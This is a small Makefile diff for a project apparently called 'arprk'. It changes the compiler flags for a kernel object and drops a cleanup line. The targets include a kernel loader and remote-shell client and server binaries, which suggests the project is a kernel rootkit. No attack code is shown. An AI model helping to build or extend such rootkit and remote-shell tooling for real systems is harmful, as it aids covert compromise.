@@ -6,7 +6,7 @@ EXTRA_CFLAGS := -O0 -I$(PWD)/capstone/include -DCAPSTONE_USE_SYS_DYN_MEM -DCAPST
 KERNEL_HEADERS = /lib/modules/$(shell uname -r)/build
 
 CFLAGS_loader.o := -fno-stack-protector -mno-fentry -fno-profile -Wno-error=incompatible-pointer-types
-CFLAGS_kernel.o := -mcmodel=small -mno-fentry -fpic -fpie -fPIE -pie -fno-stack-protector -fno-profile
+CFLAGS_kernel.o := -mcmodel=small -mno-fentry -fpic -fpie -fPIE -pie -fno-stack-protector -fno-profile -mindirect-branch=keep -mno-indirect-branch-register
 
 RSHELL_CFLAGS = -Wall -Os
 
@@ -43,7 +43,6 @@ arprk: conf rshell
 
 clean:
 	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) clean
-	rm -f *.plist
 	make -C python3 clean
 	rm rshcli rshsrv
 	rm arprk-conf.h
